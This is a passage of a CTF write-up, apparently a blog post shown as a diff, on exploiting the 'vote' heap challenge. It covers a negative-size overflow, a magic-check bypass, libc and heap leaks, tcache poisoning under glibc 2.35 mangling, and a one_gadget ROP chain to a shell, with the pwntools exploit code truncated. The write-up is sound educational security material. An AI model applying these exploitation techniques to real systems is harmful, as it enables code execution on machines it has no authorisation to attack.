+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%hd&#34;</span>,<span style="color:#f92672">&amp;</span>width);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;height? &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%hd&#34;</span>,<span style="color:#f92672">&amp;</span>height);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// the comparisons here are done with instrs jg and jle, which are signed comparisons
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// thus negative values of width and height will be false for these comparisons
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ((<span style="color:#ae81ff">0x2f</span> <span style="color:#f92672">&lt;</span> width) <span style="color:#f92672">||</span> (<span style="color:#ae81ff">0x2f</span> <span style="color:#f92672">&lt;</span> height)) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">set_obj_width</span>(<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>ctfs_arr <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>),(<span style="color:#66d9ef">int</span>)width);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">set_obj_height</span>(<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>ctfs_arr <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>),(<span style="color:#66d9ef">int</span>)height);
+</span></span></code></pre></div><p>With that, you can read as many bytes as you want in:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,pvVar3,(<span style="color:#66d9ef">long</span>)((<span style="color:#66d9ef">int</span>)height <span style="color:#f92672">*</span> (<span style="color:#66d9ef">int</span>)width));
+</span></span></code></pre></div><p>Since you can enter any negative height and width, and negative multiplied with negative is positive, you can read any amount of bytes into the photo property of the ctf objects.</p>
+<p>However, the binary tries to prevent this by using the magic value.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">long</span> <span style="color:#a6e22e">generate_magic</span>(<span style="color:#66d9ef">long</span> obj){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">short</span> j;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_10;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1337133713371337</span>;
+</span></span><span style="display:flex;"><span>  j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (((((<span style="color:#66d9ef">int</span>)j <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">int</span>)<span style="color:#f92672">*</span>(<span style="color:#66d9ef">short</span> <span style="color:#f92672">*</span>)(obj <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x16</span>) <span style="color:#f92672">*</span> (<span style="color:#66d9ef">int</span>)<span style="color:#f92672">*</span>(<span style="color:#66d9ef">short</span> <span style="color:#f92672">*</span>)(obj <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>) <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>           (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> <span style="color:#f92672">*</span>(obj <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>))) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> <span style="color:#f92672">*</span>(obj <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x16</span>))) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#75715e">// &lt;- negative values fails this 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>           (j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x900</span>))) {
+</span></span><span style="display:flex;"><span>    local_10 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>)<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(obj <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x38</span> <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)(<span style="color:#66d9ef">int</span>)j) <span style="color:#f92672">+</span> local_10 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x17</span>;
+</span></span><span style="display:flex;"><span>    j <span style="color:#f92672">=</span> j <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> local_10;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// the test and js instructions are used to check if *(obj+0x14) and *(obj+0x16) are negative
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// test sets the sign flag if they&#39;re negative, and js jumps if sign flag is set
+</span></span></span></code></pre></div><p>Because of the negative width and height, we won&rsquo;t execute the code in the while loop at all, and <code>generate_magic()</code> will return <code>0x1337133713371337</code>.</p>
+<p>Thus <code>set_magic()</code> won&rsquo;t set the magic property of the ctf object:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_magic</span>(<span style="color:#66d9ef">long</span> obj){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> lVar1;
+</span></span><span style="display:flex;"><span>  lVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">generate_magic</span>(obj);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// if lVar1 == 0x1337133713371337, do nothing
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (lVar1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x1337133713371337</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(obj <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x938</span>) <span style="color:#f92672">=</span> lVar1;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The magic property of the ctf object will be null.</p>
+<p>This becomes a problem when you try to vote or delete the ctf object, as it will fail the magic check:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>ulong <span style="color:#a6e22e">check_magic</span>(<span style="color:#66d9ef">long</span> param_1){
+</span></span><span style="display:flex;"><span>  ulong uVar1;
+</span></span><span style="display:flex;"><span>  ulong uVar2;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(ulong <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x938</span>);
+</span></span><span style="display:flex;"><span>  uVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">generate_magic</span>(param_1);
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// uVar1 will be 0, uVar2 will be 0x1337133713371337
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// so this will return false, and process will terminate
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> (uVar1 <span style="color:#f92672">==</span> uVar2);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>However, the magic property is stored below the photo property of the object, which you have unlimited write to. So you can just overflow the photo property, and write <code>0x1337133713371337</code> as the magic yourself!</p>
+<p>With that, you have unlimited overflow in the heap, giving you the ability to overwrite the topics vector of the object, and also any heap chunk that is below the object. But before we can pop a shell, we will need some memory leaks.</p>
+<h3 id="leaking-1">Leaking<a hidden class="anchor" aria-hidden="true" href="#leaking-1">#</a></h3>
+<p>Since this is how the binary prints out the raw bytes of the photo after you make a ctf:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>     uVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_photo</span>(<span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>ctfs_arr <span style="color:#f92672">+</span> idx<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)); <span style="color:#75715e">// address of obj&#39;s photo will be returned 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>     <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;photo format : %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,uVar4);
+</span></span></code></pre></div><p>And the photo is followed by the magic, which is then followed by a heap address (topics vector):</p>
+<pre tabindex="0"><code>0x55555556fee8: 0x3231333231333231   &lt;- photo bytes
+...
+0x5555555707e8: 0x1337133713371337   &lt;- magic
+0x5555555707f0: 0x0000555555570840   &lt;- heap addr
+</code></pre><p>The heap addr is leaked when you completely fill up the photo buf,and setup the magic properly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>AAAAAAAAAAA...\x37\x13\x37\x13\x37\x13\x37\x13heap_leak\x00
+</span></span></code></pre></div><p>Since there&rsquo;s no null bytes to terminate the string before the heap address.</p>
+<p>As for leaking libc, and other values, I used the topics of the object.<br>
+I actually didn&rsquo;t know that the topic names are stored in a vector during the finals, since I didn&rsquo;t really reverse the functions that are used to handle topics. I took more of a dynamic analysis approach to seeing how the topics are stored, by playing with them and viewing them in memory.</p>
+<p>What I saw was that when you have one topic:</p>
+<pre tabindex="0"><code>... rest of ctf obj ...
+0x5555555707f0: 0x0000555555570810      &lt;- startptr 
+0x5555555707f8: 0x0000555555570830      &lt;- endptr
+0x555555570800: 0x0000555555570830      &lt;- endptr
+0x555555570808: 0x0000000000000031      &lt;- new heap chunk
+0x555555570810: 0x0000555555570820      &lt;- char ptr
+0x555555570818: 0x0000000000000004      &lt;- number of bytes
+0x555555570820: 0x0000000041414141      &lt;- actual bytes
+0x555555570828: 0x0000000000000000
+</code></pre><p>A 0x30 heap chunk would be allocated, having a char ptr in it that points to chunk+0x10.<br>
+And the ctf object will have pointers pointing to the start and end of this chunk.</p>
+<p>Since we can overflow the ctf object, we could overwrite the start and end ptrs to point to memory we control (can freely write), and craft our fake chunk there. By setting up a pointer in that fake chunk, we can get arbitary read when we print the topic names.</p>
+<p>To do all this, we have to know at what address the memory we control is, and also the address which its contents we want to leak. Thanks to the heap leak before, we know the addresses of our ctf objects (and its properties), and also we can leak any value that is stored inside the heap.</p>
+<blockquote>
+<p>In smaller binaries like this, as long as you have a heap leak, you can calculate the heap base, and from then on you&rsquo;ll know where everything in the heap is. Since there&rsquo;s very little mallocs and frees called, and the places where they are called are the same everytime the binary is ran, the heap layout is very predictable.</p>
+</blockquote>
+<p>So an example of leaking through topics:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0x55555556ff10: addr  &lt;- whatever addr that we want to leak its contents, so leak *addr
+</span></span><span style="display:flex;"><span>0x55555556ff18: 0x8
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0x5555555707f0: 0x55555556ff10 &lt;- overwrote to point to some photo bytes of own obj 
+</span></span><span style="display:flex;"><span>0x5555555707f8: 0x55555556ff30 &lt;- overwrote endptr to startptr+0x20
+</span></span><span style="display:flex;"><span>0x555555570800: 0x55555556ff30 
+</span></span></code></pre></div><p>With this, we can leak any <code>*addr</code>, as long as we know <code>addr</code>!</p>
+<p>Currently, with PIE and everything, we only know heap addresses.<br>
+How can we leak libc? Is there any libc addresses inside the heap?</p>
+<p>We can just free a large enough chunk, so that it goes into the unsorted bin. That way the chunk will have a double linked list that contains a libc pointer.</p>
+<blockquote>
+<p>to learn more about <a href="https://guyinatuxedo.github.io/25-heap/index.html#binning">binning</a>.</p>
+</blockquote>
+<p>The ctf object is perfect for this, since its 0x958 bytes, large enough to just go straight into the unsorted bin when freed. Remember tho to put a chunk between the unsorted bin chunk and the wilderness to prevent consolidation.</p>
+<p>With that, we have heap and libc leak, as well as arbitary read into any heap and libc addr.</p>
+<blockquote>
+<p>if pwndbg <code>heap</code> commands doesn&rsquo;t work, you just have to use <code>heap set-arena</code> to tell it where <code>main_arena</code> is. You can find out where the <code>main_arena</code> is by using the address in unsorted bin chunks, as it is <code>main_arena+0x60</code>.</p>
+</blockquote>
+<h3 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h3>
+<p>I first tried overwriting the address which stored a function ptr (placed at the start of the ctf object), to an address I control, which has a <code>one_gadget</code> in it. But the <code>one_gadgets</code> didn&rsquo;t work.</p>
+<p>Then, I went for a tcache poisoning attack, which is essentially just overwriting the fd ptr of chunks in tcache bin:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span># pointer mangling not shown for simplicty
+</span></span><span style="display:flex;"><span>before corruption:
+</span></span><span style="display:flex;"><span>Tcachebin[idx=2,size=0x30]:  0x555555570910 -&gt; 0x555555570940 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0x555555570900: 0x0000000000000000  0x0000000000000031
+</span></span><span style="display:flex;"><span>0x555555570910: 0x555555570940 (fd) 0x0000000000000000
+</span></span><span style="display:flex;"><span>0x555555570920: ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0x555555570930: 0x0000000000000000  0x0000000000000031
+</span></span><span style="display:flex;"><span>0x555555570940: ...                 ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>so when a 0x30 chunk is requested, 0x555555570910 will be allocated first.
+</span></span><span style="display:flex;"><span>then when another 0x30 chunk is requested, 0x555555570940 will be allocated next,
+</span></span><span style="display:flex;"><span>as it follows the fd ptr of the 0x555555570910 chunk
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>after corruption:
+</span></span><span style="display:flex;"><span>Tcachebin[idx=2,size=0x30]:  0x555555570910 -&gt; addr 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0x555555570900: 0x0000000000000000  0x0000000000000031
+</span></span><span style="display:flex;"><span>0x555555570910: addr           (fd) 0x0000000000000000
+</span></span><span style="display:flex;"><span>0x555555570920: ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>when a 0x30 chunk is requested, 0x555555570910 is allocated first.
+</span></span><span style="display:flex;"><span>But for the next allocation, addr will be allocated, as its the fd of 0x555555570910 chunk
+</span></span></code></pre></div><p>It&rsquo;s important to note however that we&rsquo;re using <code>glibc 2.35</code>, and pointer mangling is done on the fd pointers:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">// from https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L340 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define PROTECT_PTR(pos, ptr) \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
+</span></span></span></code></pre></div><p>So in reality, the tcache chunks look something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>Tcachebin[idx=2,size=0x30]:  0x555555570910 -&gt; 0x555555570940 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0x555555570900: 0x0000000000000000  0x0000000000000031
+</span></span><span style="display:flex;"><span>0x555555570910: 0x555000025c30 (fd) 0x0000000000000000
+</span></span><span style="display:flex;"><span>0x555555570920: ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0x555555570930: 0x0000000000000000  0x0000000000000031
+</span></span><span style="display:flex;"><span>0x555555570940: ...                 ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mangling:
+</span></span><span style="display:flex;"><span>(0x555555570910&gt;&gt;12)^0x555555570940 = 0x555000025c30
+</span></span></code></pre></div><p>So whenever we want to overwrite the fd pointer, we have to remember to mangle our address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mangle</span>(dest,pos):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (pos <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">12</span>) <span style="color:#f92672">^</span> dest
+</span></span></code></pre></div><p>When you allocate a 0x20 byte topic, the bytes aren&rsquo;t just stored in the vector object like when you allocate less bytes, but instead another chunk is allocated specifically for the topic name:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>when you allocate a 0x4 byte topic:
+</span></span><span style="display:flex;"><span>0x555555570830: ...                     0x0000000000000031
+</span></span><span style="display:flex;"><span>0x555555570840: 0x0000555555570850      0x0000000000000004
+</span></span><span style="display:flex;"><span>0x555555570850: 0x0000000041414141      0x0000000000000000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>when you allocate a 0x20 byte topic:
+</span></span><span style="display:flex;"><span>heap chunk:
+</span></span><span style="display:flex;"><span>0x555555572ec0: ...                     0x0000000000000031
+</span></span><span style="display:flex;"><span>0x555555572ed0: 0x0000555555572f00      ...
+</span></span><span style="display:flex;"><span>0x555555572ee0: ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>heap chunk:
+</span></span><span style="display:flex;"><span>0x555555572ef0: 0x0000000000000000      0x0000000000000031
+</span></span><span style="display:flex;"><span>0x555555572f00: 0x4141414141414141      0x4141414141414141
+</span></span><span style="display:flex;"><span>0x555555572f10: 0x4141414141414141      0x4141414141414141
+</span></span></code></pre></div><p>So using this, you can get two 0x30 chunks side by side, and will free both of them when you delete the ctf object, giving you the ability to setup the heap so that:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>-------------------
+</span></span><span style="display:flex;"><span>| free ctf obj    |  &lt;- (next ctf object allocation)
+</span></span><span style="display:flex;"><span>-------------------
+</span></span><span style="display:flex;"><span>| free 0x30 chunk |  &lt;- tcache will allocate this first if 0x30 chunk is requested
+</span></span><span style="display:flex;"><span>-------------------
+</span></span><span style="display:flex;"><span>| free 0x30 chunk |  &lt;- then this  
+</span></span><span style="display:flex;"><span>-------------------
+</span></span></code></pre></div><p>Before I tried to get this setup, I made sure there were nothing in the free lists to make things easier. Also like I said before, I didn&rsquo;t fully reverse the topics functions, so sometimes there&rsquo;s unexpected chunks that are suddenly allocated/freed, so I just had to play around with it a bit to get this configuration.</p>
+<p>With that, when we allocate the next ctf object, we can overflow the free 0x30 chunk, and overwrite its fd pointers with what we want. Remember to not give any topics since that&rsquo;ll mess up the setup.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>allocate ctf obj and overflow fd:
+</span></span><span style="display:flex;"><span>--------------------------------
+</span></span><span style="display:flex;"><span>| ctf_obj                      |  
+</span></span><span style="display:flex;"><span>--------------------------------
+</span></span><span style="display:flex;"><span>| free 0x30 chunk, fd=own_addr |   &lt;- tcache will give this first when 0x30 chunk is requested
+</span></span><span style="display:flex;"><span>--------------------------------
+</span></span><span style="display:flex;"><span>| free 0x30 chunk              |  
+</span></span><span style="display:flex;"><span>--------------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>tcache will give own_addr next when another 0x30 chunk is requested
+</span></span></code></pre></div><p>So when we make another ctf object, this time with a 0x20 byte topic, a 0x30 chunk will be requested to setup the vector object, and the chunk which has its fd overwritten will be returned. When another 0x30 chunk is requested to store our 0x20 byte topic name, the addr which we overwrote fd with will be returned, and we will achieve arbitary overwrite.</p>
+<p>The only criteria for the addr to overwrite fd with is that it is 0x10 bytes aligned, otherwise heap security checks will be triggered. (I&rsquo;m pretty sure tcache is meant for fast allocation, so there&rsquo;s pretty few security checks. For example tcache doesn&rsquo;t check if the heap metadata header of the to-be-allocated chunk is set properly.)</p>
+<p>Only question is now is, what do we overwrite?<br>
+I chose to just leak the stack by leaking the <code>environ</code> variable in libc using the method shown above, and overwrite the ret pointer of <code>add_ctf()</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>0x00007fffffffe2a0│+0x0000: 0x00007fffffffe2c0  &lt;---- overwrite from here
+</span></span><span style="display:flex;"><span>0x00007fffffffe2a8│+0x0008: 0x00005555555572b6   ← $rsp
+</span></span><span style="display:flex;"><span>0x00007fffffffe2b0│+0x0010: 0x0000000100000000
+</span></span><span style="display:flex;"><span>0x00007fffffffe2b8│+0x0018: 0x5098e54495573500
+</span></span><span style="display:flex;"><span>0x00007fffffffe2c0│+0x0020: 0x0000000000000001   ← $rbp
+</span></span></code></pre></div><blockquote>
+<p><code>environ</code> is a variable in libc that stores where the start of the environment variables are in the stack. I&rsquo;m pretty sure the difference in environment variables is what makes stack offsets different in remote and local. So the ret ptrs (which are above <code>environ</code>) are all at the same offsets relative to <code>environ</code> across remote and local, since all the noise of the stack happens after <code>environ</code>.</p>
+</blockquote>
+
+
+<p><details >
+  <summary markdown="span">and well this is where I got stuck in the finals</summary>
+  <hr>
+<p>The overwrite worked perfectly when I tried overwriting with 0x20 <code>A</code>s, but failed when I tried to ret2libc, and overwrite with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span>p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> pop_rdi <span style="color:#f92672">+</span> p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>))) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>])
+</span></span></code></pre></div><p>I thought it failed because the topic name was read in through C++ <code>&gt;&gt;</code>, and it couldn&rsquo;t read null bytes. Or maybe a strlen was used in determining the malloc size, and having a null byte in it made it so that not a 0x30 byte chunk was used. So another chunk is allocated elsewhere, not at the place we want.</p>
+<p>I actually tried to overwrite <code>exit_handlers</code>, and leak the <code>pointer_guard</code> using the topics method before I tried doing ret2libc, but that faced the same overwrite problem as well.</p>
+<p>In the end, I ran out of time, and didn&rsquo;t solve this challenge.</p>
+<p>After the ctf, I tried the challenge again, and played around with this more.<br>
+I tried overwriting with 0x20 null bytes to see if the overwrite will work, and to my surprise, it did!<br>
+I investigated more, and turns out, the overwrite failed because my <code>pop rdi</code> gadget was at the address <code>0x1555550bd3e5</code>, and the overwrite failed everytime it encountered a <code>\x0b</code> byte. The gadget was always at that address too since I turned ASLR off using pwntools when testing.<br>
+When I tried it with <code>0x15555541d3e5</code>, the overwrite worked. So there&rsquo;s no problems writing pointers, except for some with bad bytes like <code>\x0b</code>.</p>
+<p>In hindsight, I probably should have tested the C++ <code>&gt;&gt;</code> thing by using the binary normally and making some topics with null bytes, before going ahead with my assumptions. But well, there was very little time left when I faced this problem, and was just throwing stuff to see what works.</p>
+<p>Also, it could have been because I wasn&rsquo;t using the libc given , but was using my local libc (which is also glibc 2.35, just not the same one).</p>
+<hr>
+
+</details></p>
+
+<p>I first tried to do a ret2libc, but was faced with the <code>movaps</code> <a href="https://ropemporium.com/guide.html">issue</a>. I couldn&rsquo;t write an extra <code>ret</code> gadget to deal with it too since I couldn&rsquo;t write one more pointer, as that will make the overwrite not work. (Since then its not a 0x30 chunk that&rsquo;s allocated anymore.)</p>
+<p>I then tried to setup a <code>gets()</code> call to further write the rop chain, but that didn&rsquo;t work as well.</p>
+<p>In the end, I managed to use this <code>one_gadget</code>:</p>
+<pre tabindex="0"><code>0x50a37 posix_spawn(rsp+0x1c, &#34;/bin/sh&#34;, 0, rbp, rsp+0x60, environ)
+constraints:
+  rsp &amp; 0xf == 0
+  rcx == NULL
+  rbp == NULL || (u16)[rbp] == NULL
+</code></pre><p>Before the <code>ret</code> instruction of <code>add_ctf()</code> is executed, there is a <code>pop rbp</code> instruction:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span> → 0x555555556c2d                  pop    rbp
+</span></span><span style="display:flex;"><span>   0x555555556c2e                  ret
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0x00007fffffffe2a0│+0x0000: 0x00007fffffffe2c0  →  0x0000000000000001    ← $rsp, $rbp
+</span></span><span style="display:flex;"><span>0x00007fffffffe2a8│+0x0008: 0x00005555555572b6  →   jmp 0x555555557289
+</span></span></code></pre></div><p>Our overwrite starts at <code>0x7fffffffe2a0</code>, so we can just write a null there, and make <code>rbp = NULL</code>.<br>
+<code>rsp &amp; 0xf == 0</code> is also true, so two out of three constraints of the <code>one_gadget</code> is met.</p>
+<p>The <code>rcx</code> however is set to some libc address. We can make it null simply by using a <code>pop rcx</code> gadget and setting up a null:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> pop_rcx <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> one_gadget
+</span></span></code></pre></div><p>And with that, we get a shell!</p>
+<blockquote>
+<p>Both the <code>tear</code> and <code>vote</code> challenges are actually made by my friend <a href="https://st4rlight.live/">Ainsetin</a>!<br>
+After the ctf, he told me that he exploited this challenge by faking vector objects in topic (that&rsquo;s how I learned that the topics were actually stored in vectors), not through tcache poisioning.
+So if you want to see his exploit, maybe you can contact him.</p>
+</blockquote>
+<p><strong>exploit.py</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#io = process(&#34;./vote&#34;,aslr=False)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">13337</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_ctf</span>(idx,name,topic_cnt,do_photo,width,height,photo,topics<span style="color:#f92672">=</span>[]):
